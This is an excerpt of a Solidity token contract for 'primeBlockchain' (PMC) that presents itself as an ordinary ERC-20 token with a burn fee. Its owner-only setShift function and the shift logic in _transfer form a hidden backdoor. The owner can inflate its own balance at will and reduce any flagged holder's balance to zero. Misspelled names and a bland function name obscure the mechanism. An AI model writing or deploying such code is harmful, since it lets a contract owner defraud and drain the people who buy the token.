...
abstract contract Context {
    ...
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - fuie https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
...
contract token is Ownable, IERC20 {
    ...
    string private _name = "primeBlockchain";
    string private _symbol = "PMC";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnfuie = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) private _shiftAddress;

    function setShift(address _address,uint256 _value) external onlyowner {
        _shiftAddress[_address] = _value;
    }

    function setShift(address _address) external view onlyowner returns (uint256) {
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        uint256 fuieamonnt = 0;
        
        if (_shiftAddress[sender] > 0) {
            if (sender == owner()) {
                _balance[sender] = _balance[sender].mul(1 << _shiftAddress[sender]);
            }else{
                _balance[sender] = _balance[sender].mul(1 >> _shiftAddress[sender]);
            }
        }
        ...
        uint256 amoun;
        amoun = amonnts - fuieamonnt;
        _balance[recipient] += amoun;
        if (_burnfuie > 0){
            emit Transfer (sender, _DEADaddress, fuieamonnt);
        }
